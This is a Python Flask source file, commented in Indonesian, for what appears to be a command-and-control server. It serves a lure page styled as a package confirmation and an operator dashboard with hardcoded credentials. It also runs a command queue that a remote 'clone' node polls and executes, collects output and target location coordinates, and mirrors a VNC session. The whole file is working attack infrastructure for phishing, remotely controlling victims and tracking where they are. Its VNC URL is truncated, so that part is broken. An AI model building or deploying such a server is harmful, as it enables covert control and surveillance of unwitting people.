from flask import Flask, render_template, request, jsonify, render_template_string
import time

app = Flask(__name__)

# 1. KREDENSIAL AMAN BARU (MENGGANTIKAN MEDUSA123)
USER_CORE = "operator_gear99"
PASS_CORE = "G99_SecureControl_2026!"

# Variabel memori untuk antrean perintah dan penyimpanan koordinat statis
current_command = None
latest_logs = ["[SYSTEM] Core Server initialized..."]
target_coordinates = {"lat": "Belum Diambil", "long": "Belum Diambil"}

@app.route('/')
def index():
    return "Gear99 Core Server Active"

@app.route('/konfirmasi-paket')
def target_page():
    return render_template('target.html')

@app.route('/operator')
def operator_dashboard():
    # Catatan: Halaman ini wajib diberi mekanisme session login di sisi production
    return render_template('operator.html')

# 2. RUTE AUTENTIKASI KREDENSIAL OPERATOR
@app.route('/login', methods=['POST'])
def login_operator():
    data = request.json
    if data.get('username') == USER_CORE and data.get('password') == PASS_CORE:
        return jsonify({"status": "authenticated", "token": "TOKEN_GEAR99_CORE_ACTIVE"})
    return jsonify({"status": "denied", "message": "Kredensial Salah!"}), 401

# 3. ANTRIAN PERINTAH SINKRONISASI
@app.route('/send_command', methods=['POST'])
def send_command():
    global current_command
    data = request.json
    current_command = data.get('command')
    add_log(f"Mengirim perintah ke sistem clone: [{current_command.upper()}]")
    return jsonify({"status": "queued"})

@app.route('/poll_command', methods=['GET'])
def poll_command():
    global current_command
    if current_command:
        cmd = current_command
        current_command = None  # Konsumsi perintah sekali pakai
        return jsonify({"command": cmd})
    return jsonify({"command": None})

# 4. PENANGANAN OUTPUT DAN LOG
@app.route('/report_output', methods=['POST'])
def report_output():
    data = request.json
    output_text = data.get('output', '')
    if "SINKRONISASI SUKSES" in output_text or "KOORDINAT SINKRON" in output_text:
        add_log(f"[NODE INFO] {output_text}")
    else:
        add_log(f"[RESPONSE] {output_text}")
    return jsonify({"status": "logged"})

@app.route('/get_logs', methods=['GET'])
def get_logs():
    return jsonify({"logs": latest_logs})

def add_log(message):
    timestamp = time.strftime('%H:%M:%S')
    latest_logs.append(f"[{timestamp}] {message}")
    # Batasi kapasitas log di memori agar VPS tidak crash
    if len(latest_logs) > 50:
        latest_logs.pop(0)
        
import requests

@app.route('/vnc_mirror')
def vnc_mirror():
    # Mengambil antarmuka VNC Docker secara internal lewat jalur lokal server
    try:
        url = "http://127.0.0"
        res = requests.get(url, timeout=5)
        return res.text
    except Exception as e:
        return f"<span style='color:#ff4a4a;'>Gagal menghubungkan ke simulator internal: {str(e)}</span>"
        
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
